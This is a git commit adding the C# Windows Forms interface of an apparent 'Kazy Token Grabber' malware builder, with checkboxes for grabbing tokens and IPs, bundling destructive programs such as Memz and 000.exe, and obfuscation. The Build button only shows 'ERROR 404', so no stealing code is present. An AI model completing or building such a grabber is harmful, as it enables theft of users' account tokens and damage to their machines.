b6a55c3f02b0f51895b84e99e48bc3944a94c38e
TheTeamHackFR <104196752+Th3Te4mH4ckFR@users.noreply.github.com>
2022-05-13 10:27:58 +0200

    Add files via upload

---
+++ KAZY GRABBER/KAZY GRABBER/MainForm.Designer.cs
@@ -0,0 +1,216 @@
+﻿/*
+ * Created by SharpDevelop.
+ * User: ACER
+ * Date: 09/05/2022
+ * Time: 17:45
+ * 
+ * To change this template use Tools | Options | Coding | Edit Standard Headers.
+ */
+namespace KAZY_GRABBER
+{
+	partial class MainForm
+	{
+		/// <summary>
+		/// Designer variable used to keep track of non-visual components.
+		/// </summary>
+		private System.ComponentModel.IContainer components = null;
+		
+		/// <summary>
+		/// Disposes resources used by the form.
+		/// </summary>
+		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+		protected override void Dispose(bool disposing)
+		{
+			if (disposing) {
+				if (components != null) {
+					components.Dispose();
+				}
+			}
+			base.Dispose(disposing);
+		}
+		
+		/// <summary>
+		/// This method is required for Windows Forms designer support.
+		/// Do not change the method contents inside the source code editor. The Forms designer might
+		/// not be able to load this method if it was changed manually.
+		/// </summary>
+		private void InitializeComponent()
+		{
+			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
+			this.panel1 = new System.Windows.Forms.Panel();
+			this.checkBox9 = new System.Windows.Forms.CheckBox();
+			this.checkBox8 = new System.Windows.Forms.CheckBox();
+			this.checkBox7 = new System.Windows.Forms.CheckBox();
+			this.button1 = new System.Windows.Forms.Button();
+			this.checkBox6 = new System.Windows.Forms.CheckBox();
+			this.checkBox5 = new System.Windows.Forms.CheckBox();
+			this.checkBox4 = new System.Windows.Forms.CheckBox();
+			this.checkBox3 = new System.Windows.Forms.CheckBox();
+			this.checkBox2 = new System.Windows.Forms.CheckBox();
+			this.checkBox1 = new System.Windows.Forms.CheckBox();
+			this.label1 = new System.Windows.Forms.Label();
+			this.panel1.SuspendLayout();
+			this.SuspendLayout();
+			// 
+			// panel1
+			// 
+			this.panel1.BackColor = System.Drawing.Color.White;
+			this.panel1.Controls.Add(this.checkBox9);
+			this.panel1.Controls.Add(this.checkBox8);
+			this.panel1.Controls.Add(this.checkBox7);
+			this.panel1.Controls.Add(this.button1);
+			this.panel1.Controls.Add(this.checkBox6);
+			this.panel1.Controls.Add(this.checkBox5);
+			this.panel1.Controls.Add(this.checkBox4);
+			this.panel1.Controls.Add(this.checkBox3);
+			this.panel1.Controls.Add(this.checkBox2);
+			this.panel1.Controls.Add(this.checkBox1);
+			this.panel1.Controls.Add(this.label1);
+			this.panel1.ForeColor = System.Drawing.SystemColors.ActiveCaption;
+			this.panel1.Location = new System.Drawing.Point(12, 12);
+			this.panel1.Name = "panel1";
+			this.panel1.Size = new System.Drawing.Size(583, 338);
+			this.panel1.TabIndex = 0;
+			// 
+			// checkBox9
+			// 
+			this.checkBox9.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox9.Location = new System.Drawing.Point(383, 218);
+			this.checkBox9.Name = "checkBox9";
+			this.checkBox9.Size = new System.Drawing.Size(197, 51);
+			this.checkBox9.TabIndex = 11;
+			this.checkBox9.Text = "Soon...";
+			this.checkBox9.UseVisualStyleBackColor = true;
+			// 
+			// checkBox8
+			// 
+			this.checkBox8.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox8.Location = new System.Drawing.Point(383, 161);
+			this.checkBox8.Name = "checkBox8";
+			this.checkBox8.Size = new System.Drawing.Size(197, 51);
+			this.checkBox8.TabIndex = 10;
+			this.checkBox8.Text = "Soon...";
+			this.checkBox8.UseVisualStyleBackColor = true;
+			// 
+			// checkBox7
+			// 
+			this.checkBox7.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox7.Location = new System.Drawing.Point(383, 104);
+			this.checkBox7.Name = "checkBox7";
+			this.checkBox7.Size = new System.Drawing.Size(197, 51);
+			this.checkBox7.TabIndex = 9;
+			this.checkBox7.Text = "Soon...";
+			this.checkBox7.UseVisualStyleBackColor = true;
+			// 
+			// button1
+			// 
+			this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+			this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.button1.Location = new System.Drawing.Point(3, 275);
+			this.button1.Name = "button1";
+			this.button1.Size = new System.Drawing.Size(577, 63);
+			this.button1.TabIndex = 8;
+			this.button1.Text = "Build";
+			this.button1.UseVisualStyleBackColor = true;
+			this.button1.Click += new System.EventHandler(this.Button1Click);
+			// 
+			// checkBox6
+			// 
+			this.checkBox6.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox6.Location = new System.Drawing.Point(206, 218);
+			this.checkBox6.Name = "checkBox6";
+			this.checkBox6.Size = new System.Drawing.Size(171, 51);
+			this.checkBox6.TabIndex = 6;
+			this.checkBox6.Text = "Obfuscate";
+			this.checkBox6.UseVisualStyleBackColor = true;
+			// 
+			// checkBox5
+			// 
+			this.checkBox5.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox5.Location = new System.Drawing.Point(206, 161);
+			this.checkBox5.Name = "checkBox5";
+			this.checkBox5.Size = new System.Drawing.Size(171, 51);
+			this.checkBox5.TabIndex = 5;
+			this.checkBox5.Text = "Screamer";
+			this.checkBox5.UseVisualStyleBackColor = true;
+			// 
+			// checkBox4
+			// 
+			this.checkBox4.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox4.Location = new System.Drawing.Point(206, 104);
+			this.checkBox4.Name = "checkBox4";
+			this.checkBox4.Size = new System.Drawing.Size(171, 51);
+			this.checkBox4.TabIndex = 4;
+			this.checkBox4.Text = "000.exe";
+			this.checkBox4.UseVisualStyleBackColor = true;
+			// 
+			// checkBox3
+			// 
+			this.checkBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox3.Location = new System.Drawing.Point(3, 218);
+			this.checkBox3.Name = "checkBox3";
+			this.checkBox3.Size = new System.Drawing.Size(197, 51);
+			this.checkBox3.TabIndex = 3;
+			this.checkBox3.Text = "Memz";
+			this.checkBox3.UseVisualStyleBackColor = true;
+			// 
+			// checkBox2
+			// 
+			this.checkBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox2.Location = new System.Drawing.Point(3, 161);
+			this.checkBox2.Name = "checkBox2";
+			this.checkBox2.Size = new System.Drawing.Size(197, 51);
+			this.checkBox2.TabIndex = 2;
+			this.checkBox2.Text = "Grab IP";
+			this.checkBox2.UseVisualStyleBackColor = true;
+			// 
+			// checkBox1
+			// 
+			this.checkBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Bold);
+			this.checkBox1.Location = new System.Drawing.Point(3, 104);
+			this.checkBox1.Name = "checkBox1";
+			this.checkBox1.Size = new System.Drawing.Size(197, 51);
+			this.checkBox1.TabIndex = 1;
+			this.checkBox1.Text = "Grab Token";
+			this.checkBox1.UseVisualStyleBackColor = true;
+			// 
+			// label1
+			// 
+			this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+			this.label1.Location = new System.Drawing.Point(0, 0);
+			this.label1.Name = "label1";
+			this.label1.Size = new System.Drawing.Size(583, 101);
+			this.label1.TabIndex = 0;
+			this.label1.Text = "Kazy Token Grabber";
+			this.label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+			// 
+			// MainForm
+			// 
+			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+			this.BackColor = System.Drawing.Color.White;
+			this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+			this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+			this.ClientSize = new System.Drawing.Size(607, 362);
+			this.Controls.Add(this.panel1);
+			this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+			this.Name = "MainForm";
+			this.Text = "KAZY GRABBER";
+			this.Load += new System.EventHandler(this.MainFormLoad);
+			this.panel1.ResumeLayout(false);
+			this.ResumeLayout(false);
+		}
+		private System.Windows.Forms.CheckBox checkBox1;
+		private System.Windows.Forms.CheckBox checkBox2;
+		private System.Windows.Forms.CheckBox checkBox3;
+		private System.Windows.Forms.CheckBox checkBox4;
+		private System.Windows.Forms.CheckBox checkBox5;
+		private System.Windows.Forms.CheckBox checkBox6;
+		private System.Windows.Forms.Button button1;
+		private System.Windows.Forms.CheckBox checkBox7;
+		private System.Windows.Forms.CheckBox checkBox8;
+		private System.Windows.Forms.CheckBox checkBox9;
+		private System.Windows.Forms.Label label1;
+		private System.Windows.Forms.Panel panel1;
+	}
+}
---
+++ KAZY GRABBER/KAZY GRABBER/MainForm.cs
@@ -0,0 +1,43 @@
+﻿/*
+ * Created by SharpDevelop.
+ * User: ACER
+ * Date: 09/05/2022
+ * Time: 17:45
+ * 
+ * To change this template use Tools | Options | Coding | Edit Standard Headers.
+ */
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Windows.Forms;
+
+namespace KAZY_GRABBER
+{
+	/// <summary>
+	/// Description of MainForm.
+	/// </summary>
+	public partial class MainForm : Form
+	{
+		public MainForm()
+		{
+			//
+			// The InitializeComponent() call is required for Windows Forms designer support.
+			//
+			InitializeComponent();
+			
+			//
+			// TODO: Add constructor code after the InitializeComponent() call.
+			//
+		}
+		
+		void MainFormLoad(object sender, EventArgs e)
+		{
+			panel1.BackColor = Color.FromArgb(100, 0, 0, 0);
+		}
+		
+		void Button1Click(object sender, EventArgs e)
+		{
+			MessageBox.Show("ERROR 404");
+		}
+	}
+}
